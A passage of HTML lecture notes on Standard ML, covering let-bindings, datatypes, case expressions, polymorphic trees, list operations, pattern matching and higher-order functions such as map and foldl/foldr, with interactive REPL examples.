<li>since $p$ is only relevant for the computation of $Area$, it is suitable for setting $p$ to be local</li>
</ul>
</li>
<li><p>we can use <code>let</code> for local declaration</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> area (a,b,c) = <span class="keyword">let</span> <span class="keyword">val</span> p = (a+b+c)/<span class="number">2.0</span> <span class="keyword">in</span> </span><br><span class="line">=     sqrt(p*(p-a)*(p-b)*(p-c))</span><br><span class="line">= <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">val</span> area = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line">- area (<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">0.0</span> : <span class="built_in">real</span></span><br><span class="line">- area (<span class="number">3.0</span>,<span class="number">4.0</span>,<span class="number">5.0</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">6.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Local declaration can be used in any expression (not just in function declaration)</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* Use it in declaraing values *)</span></span><br><span class="line">- <span class="keyword">val</span> (a,b,c) = (<span class="number">3.0</span>,<span class="number">4.0</span>,<span class="number">5.0</span>);</span><br><span class="line"><span class="keyword">val</span> a = <span class="number">3.0</span> : <span class="built_in">real</span></span><br><span class="line"><span class="keyword">val</span> b = <span class="number">4.0</span> : <span class="built_in">real</span></span><br><span class="line"><span class="keyword">val</span> c = <span class="number">5.0</span> : <span class="built_in">real</span></span><br><span class="line">- <span class="keyword">let</span> <span class="keyword">val</span> p = (a+b+c)/<span class="number">2.0</span> <span class="keyword">in</span></span><br><span class="line">=     sqrt(p*(p-a)*(p-b)*(p-c))</span><br><span class="line">= <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> it = <span class="number">6.0</span> : <span class="built_in">real</span></span><br><span class="line"><span class="comment">(* Cannot access p *)</span></span><br><span class="line">p;  <span class="comment">(* ERROR *)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* local function declaration *)</span></span><br><span class="line">- <span class="keyword">fun</span> anniversary age =</span><br><span class="line">=     <span class="keyword">let</span> <span class="keyword">fun</span> divides (x,y) = x mod y = <span class="number">0</span> <span class="keyword">in</span></span><br><span class="line">=     divides(<span class="number">10</span>,age) <span class="keyword">orelse</span> divides(<span class="number">25</span>,age)</span><br><span class="line">= <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">val</span> anniversary = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">bool</span></span><br><span class="line"></span><br><span class="line">- anniversary <span class="number">11</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">false</span> : <span class="built_in">bool</span></span><br><span class="line">- anniversary <span class="number">5</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">true</span> : <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="User-Defined-Types"><a href="#User-Defined-Types" class="headerlink" title="User-Defined Types"></a>User-Defined Types</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><ul>
<li>ML supports user-defined types</li>
<li>following example is an enumeration type  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">datatype</span> <span class="type">DIRECTION</span> = <span class="type">North</span> | <span class="type">East</span> | <span class="type">South</span> | <span class="type">West</span>;</span><br><span class="line"><span class="keyword">datatype</span> <span class="type">DIRECTION</span> = <span class="type">East</span> | <span class="type">North</span> | <span class="type">South</span> | <span class="type">West</span></span><br><span class="line">- <span class="keyword">val</span> dir = <span class="type">East</span>;</span><br><span class="line"><span class="keyword">val</span> dir = <span class="type">East</span> : <span class="type">DIRECTION</span>  <span class="comment">(* dir is DIRECTION type *)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Case-Expression"><a href="#Case-Expression" class="headerlink" title="Case Expression"></a>Case Expression</h3><ul>
<li>case expression is often used naturally in conjunction with enumeration types<ul>
<li><p>using <code>|</code> to seperate the different cases</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> dir = <span class="type">East</span>;</span><br><span class="line"><span class="keyword">val</span> dir = <span class="type">East</span> : <span class="type">DIRECTION</span>  <span class="comment">(* dir is DIRECTION type *)</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">case</span> dir <span class="keyword">of</span> <span class="type">North</span> =&gt; <span class="number">0</span></span><br><span class="line">=   |         <span class="type">East</span>  =&gt; <span class="number">90</span></span><br><span class="line">=   |         <span class="type">South</span> =&gt; <span class="number">180</span></span><br><span class="line">=   |         <span class="type">West</span>  =&gt; <span class="number">270</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example:</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">datatype</span> <span class="type">SUIT</span> = <span class="type">Spades</span> | <span class="type">Hearts</span> | <span class="type">Diamonds</span> | <span class="type">Clubs</span>;</span><br><span class="line"><span class="keyword">datatype</span> <span class="type">SUIT</span> = <span class="type">Clubs</span> | <span class="type">Diamonds</span> | <span class="type">Hearts</span> | <span class="type">Spades</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> gt_suit(_,<span class="type">Spades</span>) = <span class="literal">false</span>     <span class="comment">(* Spades is the largest *)</span></span><br><span class="line">=   | gt_suit(<span class="type">Spades</span>,_) = <span class="literal">true</span></span><br><span class="line">=   | gt_suit(<span class="type">Clubs</span>,_)  = <span class="literal">false</span>     <span class="comment">(* Clubs is the smallest *)</span></span><br><span class="line">=   | gt_suit(_,<span class="type">Clubs</span>)  = <span class="literal">true</span></span><br><span class="line">=   | gt_suit(s1,s2) = s1 = <span class="type">Hearts</span> <span class="keyword">andalso</span> s2 = <span class="type">Diamonds</span>;</span><br><span class="line"><span class="keyword">val</span> gt_suit = <span class="keyword">fn</span> : <span class="type">SUIT</span> * <span class="type">SUIT</span> -&gt; <span class="built_in">bool</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> gt_card((s1,v1),(s2,v2)) =</span><br><span class="line">=    (v1:<span class="built_in">int</span>) &gt; v2 <span class="keyword">orelse</span></span><br><span class="line">= (v1 = v2 <span class="keyword">andalso</span> gt_suit(s1,s2));</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> gt_card = <span class="keyword">fn</span> : (<span class="type">SUIT</span> * <span class="built_in">int</span>) * (<span class="type">SUIT</span> * <span class="built_in">int</span>) -&gt; <span class="built_in">bool</span> - gt_card((<span class="type">Clubs</span>,<span class="number">12</span>),(<span class="type">Spades</span>,<span class="number">12</span>));</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">false</span> : <span class="built_in">bool</span></span><br></pre></td></tr></table></figure>
<ul>
<li><font color="F54747"><strong>Noted</strong></font>: The order in case expression is <font color="F54747">very important</font>, because it has the <strong>checking order</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><ul>
<li>a data type that can represent different data types with same memory storage</li>
<li>we can define a union using <code>of</code> and <code>|</code>  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">datatype</span> num = i <span class="keyword">of</span> <span class="built_in">int</span> | r <span class="keyword">of</span> <span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">datatype</span> num = i <span class="keyword">of</span> <span class="built_in">int</span> | r <span class="keyword">of</span> <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* Represents int for value a *)</span></span><br><span class="line">- <span class="keyword">val</span> a = i(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">val</span> a = i <span class="number">3</span> : num</span><br><span class="line"></span><br><span class="line"><span class="comment">(* Represents int for value b *)</span></span><br><span class="line">- <span class="keyword">val</span> b = r(<span class="number">4.0</span>);</span><br><span class="line"><span class="keyword">val</span> b = r <span class="number">4.0</span> : num</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Polymorphic"><a href="#Polymorphic" class="headerlink" title="Polymorphic"></a>Polymorphic</h3><ul>
<li>we can define polymorphic data types</li>
<li>we declare a binary tree using polymorphic data types (<code>&#39;a</code>)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">       <span class="comment">(* value, bTree         node     lTree   * root * rTree *)</span></span><br><span class="line">- <span class="keyword">datatype</span> <span class="symbol">&#x27;a</span> bTree = empty | node <span class="keyword">of</span> <span class="symbol">&#x27;a</span> bTree * <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;a</span> bTree;</span><br><span class="line"><span class="keyword">datatype</span> <span class="symbol">&#x27;a</span> bTree = empty | node <span class="keyword">of</span> <span class="symbol">&#x27;a</span> bTree * <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;a</span> bTree</span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> btMem(e,empty) = <span class="literal">false</span>    <span class="comment">(* if empty, false *)</span></span><br><span class="line">=   | btMem(e,node(left,r,right)) = e = r <span class="keyword">orelse</span>    <span class="comment">(* e == r which found *)</span></span><br><span class="line">=     btMem(e,left) <span class="keyword">orelse</span> btMem(e,right);  <span class="comment">(* recursively search for e *)</span></span><br><span class="line"><span class="keyword">val</span> btMem = <span class="keyword">fn</span> : <span class="string">&#x27;&#x27;</span>a * <span class="string">&#x27;&#x27;</span>a bTree -&gt; <span class="built_in">bool</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> t = node(node(empty,<span class="number">2</span>,node(empty,<span class="number">4</span>,empty)),</span><br><span class="line">=           <span class="number">1</span>,</span><br><span class="line">=           node(node(empty,<span class="number">5</span>,empty),<span class="number">3</span>,empty));</span><br><span class="line"><span class="keyword">val</span> t = node (node (empty,<span class="number">2</span>,node #),<span class="number">1</span>,node (node #,<span class="number">3</span>,empty)) : <span class="built_in">int</span> bTree</span><br><span class="line"></span><br><span class="line">- btMem(<span class="number">3</span>,t);</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">true</span> : <span class="built_in">bool</span></span><br><span class="line">- btMem(<span class="number">0</span>,t);</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">false</span> : <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul>
<li><code>[]</code> denotes empty list</li>
<li>Every non-empty tree contains<ol>
<li>The first element (<code>head</code>)</li>
<li>The list of remaining elements (<code>tail</code>)</li>
</ol>
</li>
</ul>
<h3 id="Combination"><a href="#Combination" class="headerlink" title="Combination"></a>Combination</h3><ul>
<li><p>we can combine the head and tail using the <font color="3A75EA">cons</font> operator <code>::</code>, written as <code>H::T</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="number">1</span> :: <span class="literal">[]</span>;</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">1</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line">- <span class="number">2</span> :: (<span class="number">1</span> :: <span class="literal">[]</span>);</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">2</span>,<span class="number">1</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* It is the combination for head and tail only *)</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] :: <span class="number">4</span>;     <span class="comment">(* ERROR *)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>we can combine two lists using <code>@</code> operator (append)</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] @ [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line">- it @ [<span class="number">7</span>,<span class="number">8</span>] @ [~<span class="number">9</span>];</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,~<span class="number">9</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Homogeneous"><a href="#Homogeneous" class="headerlink" title="Homogeneous"></a>Homogeneous</h3><ul>
<li><font color="F54747"><strong>Note</strong></font>: Lists in ML are <font color="F54747">homogeneous</font> elements of a list <font color="3A75EA">must be same type</font> (<font color="F54747">type sensitivity</font>)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* String Type *)</span></span><br><span class="line">- [<span class="string">&quot;husky&quot;</span>, <span class="string">&quot;shiba&quot;</span>];</span><br><span class="line"><span class="keyword">val</span> it = [<span class="string">&quot;husky&quot;</span>,<span class="string">&quot;shiba&quot;</span>] : <span class="built_in">string</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* [List] Type *)</span></span><br><span class="line">- <span class="keyword">val</span> l = [[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]];</span><br><span class="line"><span class="keyword">val</span> l = [[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]] : <span class="built_in">int</span> <span class="built_in">list</span> <span class="built_in">list</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] :: l;</span><br><span class="line"><span class="keyword">val</span> it = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]] : <span class="built_in">int</span> <span class="built_in">list</span> <span class="built_in">list</span></span><br><span class="line">- <span class="number">0</span> :: l;   <span class="comment">(* ERROR *)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* List combination *)</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] @ [<span class="number">4.0</span>, <span class="number">5.0</span>];     <span class="comment">(* ERROR *)</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] @ <span class="number">2</span>   <span class="comment">(* ERROR *)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3><ul>
<li>Build-in function <code>hd()</code> (get the head element) and <code>tl()</code> (get the remaining list)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- hd([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">3</span> : <span class="built_in">int</span></span><br><span class="line">- tl([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]);</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- hd(tl(tl(tl([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]))));</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">6</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Pattern-Matching"><a href="#Pattern-Matching" class="headerlink" title="Pattern Matching"></a>Pattern Matching</h3><ul>
<li><p>using selectors <code>if-then-else</code> to implement summation</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> sumList <span class="built_in">list</span> = <span class="keyword">if</span> null <span class="built_in">list</span> <span class="keyword">then</span> <span class="number">0</span>    <span class="comment">(* if this is empty, then 0 (return 0) *)</span></span><br><span class="line">=     <span class="keyword">else</span> hd(<span class="built_in">list</span>) + sumList(tl(<span class="built_in">list</span>));</span><br><span class="line"><span class="keyword">val</span> sumList = <span class="keyword">fn</span> : <span class="built_in">int</span> <span class="built_in">list</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">- sumList([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">15</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>using pattern matching instead of selectors <code>if-then-else</code> to implement summation</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> sumList <span class="literal">[]</span> = <span class="number">0</span></span><br><span class="line">=   | sumList(a::<span class="built_in">list</span>) = a + sumList <span class="built_in">list</span>;  <span class="comment">(* like parsing them into a :: list *)</span></span><br><span class="line"><span class="keyword">val</span> sumList = <span class="keyword">fn</span> : <span class="built_in">int</span> <span class="built_in">list</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">- sumList [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">10</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Higher-Order-Functions"><a href="#Higher-Order-Functions" class="headerlink" title="Higher-Order Functions"></a>Higher-Order Functions</h2><ul>
<li>functions that take functions as arguments and&#x2F;or produce functions as values (because function is actually a value)<ul>
<li>the function <code>double</code> takes <code>f</code> as input (argument) and <em>return</em> another function that always return twice the result of <code>f</code>  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* fucntion name: double, f: the argument of double *)</span></span><br><span class="line">- <span class="keyword">fun</span> double f = <span class="keyword">fn</span> x =&gt; <span class="number">2</span> * f(x);</span><br><span class="line"><span class="keyword">val</span> double = <span class="keyword">fn</span> : (<span class="symbol">&#x27;a</span> -&gt; <span class="built_in">int</span>) -&gt; <span class="symbol">&#x27;a</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* Delcare the function that be the argument in double *)</span></span><br><span class="line">- <span class="keyword">fun</span> inc x = x + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">val</span> inc = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- <span class="keyword">fun</span> inc2 x = x + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">val</span> inc2 = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">- double inc <span class="number">3</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">8</span> : <span class="built_in">int</span>    <span class="comment">(* (3+1) * 2 *)</span></span><br><span class="line">- double inc2 <span class="number">3</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">10</span> : <span class="built_in">int</span>   <span class="comment">(* (3+2) * 2 *)</span></span><br><span class="line">- double inc;</span><br><span class="line"><span class="keyword">val</span> it = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><ul>
<li>map function that takes as input a function <code>f</code> and a list <code>[a1, ..., an]</code>, and produces the list <code>[f(a1), ..., f(an)]</code> as output  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* parse the list into x + [xs], then f(x)::map(f, xs) *)</span></span><br><span class="line">- <span class="keyword">fun</span> map(f,<span class="literal">[]</span>) = <span class="literal">[]</span></span><br><span class="line">=   | map(f,x::xs) = f(x)::map(f,xs);</span><br><span class="line"><span class="keyword">val</span> map = <span class="keyword">fn</span> : (<span class="symbol">&#x27;a</span> -&gt; <span class="symbol">&#x27;b</span>) * <span class="symbol">&#x27;a</span> <span class="built_in">list</span> -&gt; <span class="symbol">&#x27;b</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> inc x = x + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">val</span> inc = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- map(inc,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="foldl-amp-foldr"><a href="#foldl-amp-foldr" class="headerlink" title="foldl &amp; foldr"></a><code>foldl</code> &amp; <code>foldr</code></h3><ul>
<li><p>It takes as input a function <code>f</code>, an initial value <code>x</code>, and a list <code>[a1, ..., an]</code></p>
</li>
<li><p><code>foldl</code> produces as output the value <code>f(an, f(an-1, ... , f(a2, f(a1, x))))</code></p>
</li>
<li><p><code>foldr</code> produces as output the value <code>f(a1, f(a2, ... f(an-1, f(an, x)...)))</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> add(x,y) = x + y;     <span class="comment">(* It is necessary to use tuple be argument when using foldl *)</span></span><br><span class="line"><span class="keyword">val</span> add = <span class="keyword">fn</span> : <span class="built_in">int</span> * <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- foldl add <span class="number">1</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">15</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Note that the following implementation is wrong as foldl does not expect take 2 arguments for the function f</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> add x y = x + y;</span><br><span class="line"><span class="keyword">val</span> add = <span class="keyword">fn</span> : <span class="built_in">int</span> * <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- foldl add <span class="number">1</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];        <span class="comment">(* Error *)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>We can use the functions in other packages</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> <span class="type">L</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">val</span> <span class="type">L</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> real_nums = map <span class="built_in">real</span> <span class="type">L</span>;</span><br><span class="line"><span class="keyword">val</span> real_nums = [<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>,<span class="number">4.0</span>] : <span class="built_in">real</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> r = foldl <span class="type">Math</span>.pow <span class="number">1.0</span> real_nums;     <span class="comment">(* foldl: pow(4, pow(3, pow(2, pow(1, 1)))) *)</span></span><br><span class="line"><span class="keyword">val</span> r = <span class="number">262144.0</span> : <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> r = foldr <span class="type">Math</span>.pow <span class="number">1.0</span> real_nums;     <span class="comment">(* foldr: pow(1, pow(2, pow(3, pow(4, 1)))) *)</span></span><br><span class="line"><span class="keyword">val</span> r = <span class="number">1.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
</search>
